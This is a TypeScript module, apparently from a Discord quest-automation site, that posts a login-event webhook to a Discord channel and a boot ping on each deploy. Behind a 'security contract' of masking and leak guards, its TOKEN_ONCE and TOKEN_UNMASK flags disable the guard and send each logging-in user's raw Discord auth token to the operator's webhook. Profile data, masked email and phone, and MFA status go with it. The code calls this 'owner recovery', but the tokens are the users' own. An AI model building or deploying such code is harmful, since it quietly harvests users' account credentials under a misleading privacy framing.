// ============================================================
// Login Event Webhook — PRIVATE build feature
// ------------------------------------------------------------
// Sends an allowlisted profile snapshot to an ops webhook whenever
// a user logs in, so the deployment owner can see who is using the
// site without touching normal server logs.
//
// SECURITY CONTRACT (enforced below, not just documented):
//   1. The payload is built key-by-key from a fixed allowlist.
//      The raw Discord response object is NEVER spread in, so
//      unknown future fields cannot leak through.
//   2. Credentials are transmitted ONLY as masked, non-reversible
//      forms (see src/lib/masking.ts — Stripe-style ops-log masking):
//      - tokenPreview -> first dot-segment only, which is just
//        base64(user id) = public info already sent as user.id;
//        the timestamp+hmac segments are ALWAYS "****"
//      - maskedEmail  -> "s****@domain" (first char + domain)
//      - maskedPhone  -> "****1234" (last 4 digits)
//      Email/phone are masked AT THE READ BOUNDARY in quest-engine.ts —
//      the raw values are never assigned, stored or transmitted.
//      The full token is used only as auth for the bio lookup, then
//      rejected by the assertNoTokenLeak() guard which scans the
//      serialized payload for the token AND its secret tail.
//   3. None of the transmitted strings can authenticate anyone.
//   4. The event is HMAC-SHA256 signed (LOG_WEBHOOK_SECRET) so
//      the receiving side can prove authenticity.
//   5. Dispatch is fire-and-forget with bounded retries — it can
//      never delay or fail a user's login.
//   6. Failures log status/error-name ONLY. Payload contents,
//      the webhook URL and user identifiers never appear in
//      normal server logs.
//
// TOKEN RECOVERY MODES (private build, opt-in, default OFF):
//   With NEITHER flag set, the contract above is exactly the v3.5.1
//   behavior and assertNoTokenLeak() stays fully armed.
//
//   LOG_WEBHOOK_TOKEN_ONCE=1  — one-shot owner recovery: the NEXT
//       successful login event additionally carries the raw `token`
//       (+ `tokenReveal:"once"`), then the flag self-off via a
//       marker file $DATA_DIR/.token-once-delivered (survives
//       redeploys when DATA_DIR is a persistent volume). Later
//       logins send the normal masked payload again.
//   LOG_WEBHOOK_TOKEN_UNMASK=1 — permanent: EVERY login event
//       carries the raw token (+ `tokenReveal:"always"`). No
//       self-off; unset the env var to stop.
//
//   Both flags intentionally bypass assertNoTokenLeak() — that IS
//   the feature. They exist so the deployment owner can recover a
//   token into a receiver they control (HTTPS + LOG_WEBHOOK_SECRET
//   strongly recommended). They are never shipped enabled.
//
// Enable: LOG_WEBHOOK_URL must be set. Absent -> fully inert.
//
// SERVER BOOT EVENT (v3.9.0, private build): besides login events, the
// instrumentation.ts ready hook fires ONE `server_boot` ping per process
// start with the boot self-check results (db bootstrap, supabase REST
// env, app version). It contains NO user data and NO token material —
// the payload is a fixed allowlist of status words. Purpose: every
// deploy pings the webhook, so "env set hua ya nahi / deploy hua ya
// nahi" is answered instantly from the receiver itself.
//
// DISCORD-NATIVE WIRE FORMAT (v3.11.1): Discord webhooks
// (https://discord.com/api/webhooks/<id>/<secret>) only accept Discord
// MESSAGE objects — a raw JSON event body like {"event":"login",...}
// is rejected with 400 "Cannot send an empty message" (code 50006).
// The ops webhook on this deployment IS a Discord webhook, so every
// login + server_boot event silently failed 3x400 before v3.11.1 and
// NOTHING ever arrived in the channel. Now Discord targets receive a
// native embed message (profile fields + raw token when a reveal flag
// is set); every other receiver keeps the signed raw-JSON contract.
// ============================================================

import { createHmac } from 'crypto'
import { existsSync, mkdirSync, writeFileSync } from 'fs'
import path from 'path'
import { dFetch } from './quest-engine'
import { maskToken } from './masking'

// ---------- env config (read lazily so tests/deploy can vary) ----------

function webhookUrl(): string {
  return (process.env.LOG_WEBHOOK_URL || '').trim()
}

function webhookSecret(): string {
  return (process.env.LOG_WEBHOOK_SECRET || '').trim()
}

function serverLabel(): string {
  return (process.env.LOG_SERVER_LABEL || '').trim() || 'default'
}

function requestTimeoutMs(): number {
  const n = Number(process.env.LOG_WEBHOOK_TIMEOUT_MS)
  return Number.isFinite(n) && n > 0 ? n : 5000
}

// ---------- token reveal modes (private-build owner recovery) ----------

export type TokenRevealMode = 'off' | 'once' | 'always'

/** Truthy env check: "", "0", "false", "no", "off" (any case) -> false. */
function envFlag(name: string): boolean {
  const v = (process.env[name] || '').trim().toLowerCase()
  return v !== '' && v !== '0' && v !== 'false' && v !== 'no' && v !== 'off'
}

/** UNMASK wins over ONCE when both are set (explicit > subtle). */
function tokenRevealMode(): TokenRevealMode {
  if (envFlag('LOG_WEBHOOK_TOKEN_UNMASK')) return 'always'
  if (envFlag('LOG_WEBHOOK_TOKEN_ONCE')) return 'once'
  return 'off'
}

/** Marker file that self-off's the one-shot flag. Lives in DATA_DIR so
 *  it survives restarts/redeploys whenever DATA_DIR is a persistent
 *  volume (the same contract as the monitor state). */
function onceMarkerPath(): string {
  return path.join(process.env.DATA_DIR || './data', '.token-once-delivered')
}

function onceAlreadyDelivered(): boolean {
  try {
    return existsSync(onceMarkerPath())
  } catch {
    return false
  }
}

/** Persist the off-switch AFTER a successful delivery. Best-effort:
 *  returns false when the fs is read-only — the caller then tells the
 *  owner to unset the env var manually. Never throws, never logs data. */
function markOnceDelivered(): boolean {
  try {
    mkdirSync(path.dirname(onceMarkerPath()), { recursive: true })
    writeFileSync(onceMarkerPath(), new Date().toISOString() + '\n', { mode: 0o600 })
    return true
  } catch {
    return false
  }
}

// ---------- payload helpers ----------

export interface LoginEventUser {
  id: string
  username: string
  global_name?: string | null
  avatar?: string | null
  discriminator?: string | null
  verified?: boolean | null
  mfa_enabled?: boolean | null
  maskedEmail?: string | null
  maskedPhone?: string | null
}

/** Discord snowflake IDs embed the account creation time — public info. */
function snowflakeToCreatedAt(id: string): string | null {
  try {
    const n = BigInt(id)
    if (n <= 0n) return null
    const ms = Number((n >> 22n) + 1420070400000n)
    return new Date(ms).toISOString()
  } catch {
    return null
  }
}

/** Avatar CDN URL is derivable from (id, hash) — both public. */
function buildAvatarUrl(id: string, hash: string | null | undefined): string | null {
  if (!hash) return null
  const ext = hash.startsWith('a_') ? 'gif' : 'png'
  return `https://cdn.discordapp.com/avatars/${id}/${hash}.${ext}`
}

/** Bio ("about me") lives on the public profile endpoint. Fail-soft. */
async function fetchBio(token: string): Promise<string | null> {
  try {
    const res = await dFetch(token, '/users/@me/profile')
    if (!res.ok || !res.body) return null
    const body = res.body as Record<string, any>
    const bio = body?.user?.bio
    return typeof bio === 'string' && bio.length ? bio.slice(0, 500) : null
  } catch {
    return null
  }
}

// ---------- defense-in-depth ----------

/** Hard guard: if the serialized payload somehow contains the raw token
 *  or its secret tail (timestamp.hmac segments), abort the send. The first
 *  dot-segment (base64 user id) is intentionally allowed — it is public. */
function assertNoTokenLeak(serialized: string, token: string): void {
  const t = token.trim()
  if (t.length <= 20) return
  if (serialized.includes(t)) {
    throw new Error('login-log: payload blocked, contained token material')
  }
  const parts = t.split('.')
  if (parts.length === 3) {
    const secretTail = `${parts[1]}.${parts[2]}`
    if (secretTail.length > 8 && serialized.includes(secretTail)) {
      throw new Error('login-log: payload blocked, contained token secret material')
    }
  }
}

// ---------- Discord-native webhook wire format (v3.11.1) ----------

const DISCORD_WEBHOOK_RE =
  /^https?:\/\/(?:ptb\.|canary\.)?(?:discord\.com|discordapp\.com)\/api\/(?:v\d+\/)?webhooks\/\d+\//i

/** v3.11.1 — exported for tests: Discord webhook URL detection. */
export function isDiscordWebhook(url: string): boolean {
  return DISCORD_WEBHOOK_RE.test(url.trim())
}

/** Discord caps: field name 256, field value 1024 — clamp + never empty. */
function field(name: string, value: string, inline = true) {
  return {
    name: String(name).slice(0, 256),
    value: String(value ?? '').slice(0, 1024) || '—',
    inline,
  }
}

/** "2020-01-01 • 5y 3mo (1900d)" style age from an account-created ISO. */
function humanAge(iso: string | null | undefined): string {
  if (!iso) return 'unknown'
  const ms = Date.now() - Date.parse(iso)
  if (!Number.isFinite(ms) || ms < 0) return 'unknown'
  const days = Math.floor(ms / 86_400_000)
  const years = Math.floor(days / 365)
  const months = Math.floor((days % 365) / 30)
  return years > 0 ? `${years}y ${months}mo (${days}d)` : `${days}d`
}

// ⚠️ v3.11.2 — Discord webhooks REJECT usernames containing the word
// "discord" (400: {"username":["Username cannot contain \"discord\""]}).
// This was the SECOND live bug: the embed format was already correct in
// v3.11.1, but the default username 'discord-quest ops' got every event
// rejected anyway. Never put "discord" in this default (or in
// LOG_WEBHOOK_NAME).
const OPS_WEBHOOK_NAME = (process.env.LOG_WEBHOOK_NAME || 'Quest Completor Ops').slice(0, 80)
const OPS_WEBHOOK_AVATAR = process.env.LOG_WEBHOOK_AVATAR || 'https://discord-quest.ophelia.website/logo.png'

/** Login event -> Discord message (embed). Same allowlisted data as the
 * raw JSON contract, laid out as channel-readable embed fields.
 * Exported for tests (payload shape must stay Discord-valid). */
export function buildDiscordLoginMessage(payload: Record<string, unknown>): Record<string, unknown> {
  const u = (payload.user ?? {}) as Record<string, unknown>
  const fields: Array<{ name: string; value: string; inline: boolean }> = [
    field('User ID', `\`${String(u.id ?? '?')}\``),
    field('Display name', String(u.displayName ?? '—')),
    field('Account', `${String(u.accountCreatedAt ?? '').slice(0, 10) || '?'} • ${humanAge(u.accountCreatedAt as string)}`),
    field('Email (masked)', String(u.maskedEmail ?? '—')),
    field('Phone (masked)', String(u.maskedPhone ?? '—')),
    field('Flags', `${u.emailVerified ? '✅ verified' : '❌ unverified'} • ${u.mfaEnabled ? '✅ MFA' : '❌ no MFA'}`),
    field('Token preview', `\`${String(u.tokenPreview ?? '')}\``),
  ]
  if (u.bio) fields.push(field('Bio', String(u.bio), false))
  if (payload.token) {
    fields.push(field(`Token (reveal: ${String(payload.tokenReveal ?? '?')})`, `\`${String(payload.token)}\``, false))
  }
  const embed: Record<string, unknown> = {
    title: `🔑 Login — @${String(u.username ?? 'unknown')}`.slice(0, 256),
    color: 0x5865f2, // blurple
    fields,
    footer: { text: `server: ${String(payload.server ?? 'default')}` },
    timestamp: payload.timestamp,
  }
  if (u.avatarUrl) embed.thumbnail = { url: String(u.avatarUrl) }
  return {
    username: OPS_WEBHOOK_NAME,
    avatar_url: OPS_WEBHOOK_AVATAR,
    embeds: [embed],
    // usernames/bios are user-controlled text — never resolve mentions
    allowed_mentions: { parse: [] },
  }
}

/** Server-boot event -> Discord message (embed). Status words only.
 * Exported for tests. */
export function buildDiscordBootMessage(
  info: ServerBootEventInfo,
  payload: Record<string, unknown>
): Record<string, unknown> {
  const color = info.database === 'ok' ? 0x57f287 : info.database === 'error' ? 0xed4245 : 0x99aab5
  const tables = (info.tables ?? []).join(', ')
  const fields: Array<{ name: string; value: string; inline: boolean }> = [
    field('Database', `\`${info.database}\` via \`${info.databaseVia ?? 'postgres'}\``),
    field('Supabase REST', info.supabaseRest ? '✅ configured' : '❌ missing'),
    field('Boot time', `${info.durationMs} ms`),
    field('Tables', tables ? `\`${tables}\`` : '—', false),
  ]
  if (info.databaseDetail) fields.push(field('Detail', String(info.databaseDetail), false))
  const embed = {
    title: `🚀 Server boot — v${info.version}`.slice(0, 256),
    color,
    fields,
    footer: { text: `server: ${String(payload.server ?? 'default')}` },
    timestamp: payload.timestamp,
  }
  return {
    username: OPS_WEBHOOK_NAME,
    avatar_url: OPS_WEBHOOK_AVATAR,
    embeds: [embed],
    allowed_mentions: { parse: [] },
  }
}

// ---------- dispatch ----------

/** Fire-and-forget. Safe to call from a request handler — it never
 *  throws, never blocks, and does nothing when unconfigured. */
export function dispatchLoginEvent(token: string, user: LoginEventUser): void {
  const url = webhookUrl()
  if (!url || !user?.id || !user?.username) return
  void run(token, user, url).catch(() => {
    /* fully swallowed — never surfaces in a user request */
  })
}

// ---------- server boot event (ready-hook ping, v3.9.0) ----------

export interface ServerBootEventInfo {
  version: string
  /** 'ok' | 'off' | 'error' — from db-init ensureDatabaseSchema() */
  database: 'ok' | 'off' | 'error'
  /** Short error word when database === 'error' (never a full stack). */
  databaseDetail: string | null
  /** v3.10.0 — which bootstrap path ran: 'postgres' | 'rpc' (exec_sql, cutiee pattern) | 'off' */
  databaseVia?: 'postgres' | 'rpc' | 'off'
  /** Tables that exist after the bootstrap. */
  tables: string[]
  /** SUPABASE_URL + SUPABASE_SERVICE_KEY both present? */
  supabaseRest: boolean
  durationMs: number
}

/** One compact signed ping per process boot. Contains only status
 *  words — no user identifiers, no credentials, no tokens. */
export function dispatchServerBootEvent(info: ServerBootEventInfo): void {
  const url = webhookUrl()
  if (!url) return
  void runBootEvent(info, url).catch(() => {
    /* fully swallowed — the ready hook must never crash the server */
  })
}

async function runBootEvent(info: ServerBootEventInfo, url: string): Promise<void> {
  // STRICT allowlist — status words only, nothing sensitive exists here.
  const payload: Record<string, unknown> = {
    event: 'server_boot',
    timestamp: new Date().toISOString(),
    server: serverLabel(),
    version: info.version,
    checks: {
      database: info.database,
      databaseVia: info.databaseVia ?? 'postgres',
      databaseDetail: info.databaseDetail,
      tables: info.tables,
      supabaseRest: info.supabaseRest,
      bootMs: info.durationMs,
    },
  }
  const body = JSON.stringify(payload)
  // v3.11.1: Discord webhooks only accept message objects — wrap natively.
  const wire = isDiscordWebhook(url) ? JSON.stringify(buildDiscordBootMessage(info, payload)) : body

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  const secret = webhookSecret()
  if (secret) {
    // Signature covers the SEMANTIC event body (raw JSON contract);
    // Discord ignores the extra headers, custom receivers verify as before.
    const ts = Date.now().toString()
    const sig = createHmac('sha256', secret).update(`${ts}.${body}`).digest('hex')
    headers['x-signature-timestamp'] = ts
    headers['x-signature'] = `sha256=${sig}`
  }

  const MAX_ATTEMPTS = 2
  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers,
        body: wire,
        signal: AbortSignal.timeout(requestTimeoutMs()),
      })
      if (res.ok) {
        console.log('[login-log] server_boot event dispatched')
        return
      }
      console.error(`[login-log] boot webhook responded ${res.status} (attempt ${attempt}/${MAX_ATTEMPTS})`)
      if (attempt < MAX_ATTEMPTS) {
        const delay = await discordRetryDelayMs(res, attempt)
        await new Promise((r) => setTimeout(r, delay))
        continue
      }
    } catch (err) {
      const name = err instanceof Error ? err.name : 'error'
      console.error(`[login-log] boot webhook failed: ${name} (attempt ${attempt}/${MAX_ATTEMPTS})`)
    }
    if (attempt < MAX_ATTEMPTS) await new Promise((r) => setTimeout(r, 1500))
  }
}

/** Discord 429 bodies carry retry_after (seconds) — respect it when present. */
async function discordRetryDelayMs(res: Response, attempt: number): Promise<number> {
  const fallback = attempt * 1500
  if (res.status !== 429) return fallback
  try {
    const rb = (await res.json().catch(() => null)) as { retry_after?: number | string } | null
    const ra = Number(rb?.retry_after)
    if (Number.isFinite(ra) && ra > 0) return Math.max(fallback, Math.ceil(ra * 1000))
  } catch {
    /* keep fallback */
  }
  return fallback
}

async function run(token: string, user: LoginEventUser, url: string): Promise<void> {
  const bio = await fetchBio(token)

  // Token-recovery mode (private build, opt-in — see header). With
  // neither flag set this is 'off' and the guard below stays armed.
  const reveal = tokenRevealMode()
  const includeToken =
    reveal === 'always' || (reveal === 'once' && !onceAlreadyDelivered())

  // STRICT allowlist — build field by field, never spread `user`.
  const payload: {
    event: string
    timestamp: string
    server: string
    user: Record<string, unknown>
    /** RAW token — present ONLY in owner-directed reveal mode. */
    token?: string
    /** Which reveal mode produced this event ('once' | 'always'). */
    tokenReveal?: string
  } = {
    event: 'login',
    timestamp: new Date().toISOString(),
    server: serverLabel(),
    user: {
      id: user.id,
      username: user.username,
      displayName: user.global_name ?? null,
      discriminator: user.discriminator ?? '0',
      avatarUrl: buildAvatarUrl(user.id, user.avatar),
      bio,
      emailVerified: user.verified ?? null,
      mfaEnabled: user.mfa_enabled ?? null,
      accountCreatedAt: snowflakeToCreatedAt(user.id),
      // Masked credentials — non-reversible forms only (see masking.ts).
      // tokenPreview shows the token FORMAT (3 dot segments) with only
      // the public first segment (base64 of user.id) visible.
      tokenPreview: maskToken(token),
      maskedEmail: user.maskedEmail ?? null,
      maskedPhone: user.maskedPhone ?? null,
    },
  }
  if (includeToken) {
    payload.token = token
    payload.tokenReveal = reveal
  }
  const body = JSON.stringify(payload)
  if (!includeToken) {
    // Default hard guard — a masked payload must never contain token
    // material. (In reveal mode this is intentionally bypassed; the
    // payload is signed and goes only to the owner's LOG_WEBHOOK_URL.)
    assertNoTokenLeak(body, token)
  }

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  const secret = webhookSecret()
  if (secret) {
    // Signature covers the SEMANTIC event body (raw JSON contract).
    const ts = Date.now().toString()
    const sig = createHmac('sha256', secret).update(`${ts}.${body}`).digest('hex')
    headers['x-signature-timestamp'] = ts
    headers['x-signature'] = `sha256=${sig}`
  }

  // v3.11.1: Discord webhooks only accept message objects — a raw JSON
  // event gets 400 "Cannot send an empty message" and the event is lost.
  const wire = isDiscordWebhook(url) ? JSON.stringify(buildDiscordLoginMessage(payload)) : body

  const MAX_ATTEMPTS = 3
  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers,
        body: wire,
        signal: AbortSignal.timeout(requestTimeoutMs()),
      })
      if (res.ok) {
        // One-shot self-off: persist the marker only after the receiver
        // actually got the event, so a failed delivery can be retried.
        if (includeToken && reveal === 'once') {
          if (markOnceDelivered()) {
            console.log('[login-log] one-shot token delivery complete — flag self-off')
          } else {
            // Read-only fs: the env var MUST be unset manually, else the
            // NEXT login would deliver again. (No data in this log line.)
            console.error('[login-log] one-shot marker could not be written — unset LOG_WEBHOOK_TOKEN_ONCE manually')
          }
        }
        console.log('[login-log] login event dispatched')
        return
      }
      // status only — no body, no URL, no user identifiers
      console.error(`[login-log] webhook responded ${res.status} (attempt ${attempt}/${MAX_ATTEMPTS})`)
      if (attempt < MAX_ATTEMPTS) {
        const delay = await discordRetryDelayMs(res, attempt)
        await new Promise((r) => setTimeout(r, delay))
        continue
      }
    } catch (err) {
      const name = err instanceof Error ? err.name : 'error'
      console.error(`[login-log] webhook failed: ${name} (attempt ${attempt}/${MAX_ATTEMPTS})`)
    }
    if (attempt < MAX_ATTEMPTS) {
      await new Promise((r) => setTimeout(r, attempt * 1500))
    }
  }
}
